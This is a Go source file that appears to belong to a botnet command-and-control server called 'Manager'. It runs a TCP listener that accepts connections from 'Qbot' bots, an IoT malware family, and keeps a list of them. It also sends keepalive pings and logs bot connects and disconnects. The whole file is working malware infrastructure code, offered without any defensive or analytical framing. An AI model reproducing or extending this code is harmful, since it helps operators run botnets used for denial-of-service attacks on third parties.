package raw

import (
	"Manager/database"
	"fmt"
	"net"
	"strings"
	"time"
)

func QbotListener() {
	if database.Config.QBot.Enabled {
		server, err := net.Listen("tcp", database.Config.QBot.Host+":"+fmt.Sprint(database.Config.QBot.Port))
		database.Info("Qbot Listener Running on " + database.Config.QBot.Host + ":" + fmt.Sprint(database.Config.QBot.Port))
		database.CheckError(err)
		go CheckQBots()
		for {
			conn, err := server.Accept()
			if database.CheckDuplicate(strings.Split(conn.RemoteAddr().String(), ":")[0]) {
				err := conn.Close()
				if err != nil {
					return
				}
				continue
			} else {
				database.Qbots = append(database.Qbots, conn)
				database.CheckError(err)
				go QBotHandler(conn)
				database.Info("[ACCEPTED] Bot (Qbot) Connected (" + conn.RemoteAddr().String() + ")")
				database.SendLog("[ACCEPTED] Bot (Qbot) Connected (" + conn.RemoteAddr().String() + ")")
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func CheckQBots() {
	for {
		if len(database.Qbots) > 0 {
			for _, bot := range database.Qbots {
				time.Sleep(20 * time.Second)
				_, err := bot.Write([]byte("\r\nPING\r\n"))
				if err != nil {
					RemoveQbot(bot)
					return
				}
				return
			}
		}
		time.Sleep(1 * time.Second)
	}
}

func QBotHandler(conn net.Conn) {
	buffer := make([]byte, 32)
	for {
		if n, err := conn.Read(buffer); n == 0 || err != nil {
			RemoveQbot(conn)
			return
		}
		time.Sleep(1 * time.Second)
	}
}

func RemoveQbot(conn net.Conn) {
	for i, bot := range database.Qbots {
		if bot.RemoteAddr().String() == conn.RemoteAddr().String() {
			database.Qbots = append(database.Qbots[:i], database.Qbots[i+1:]...)
			database.Info("(DISCONNECTED) Bot (Qbot) Disconnected (" + conn.RemoteAddr().String() + ")")
			database.SendLog("(DISCONNECTED) Bot (Qbot) Disconnected (" + conn.RemoteAddr().String() + ")")
			if database.BlockedIPs[conn.RemoteAddr().String()] {
				delete(database.BlockedIPs, conn.RemoteAddr().String())
			}
			err := conn.Close()
			if err != nil {
				return
			}
		}
	}
}
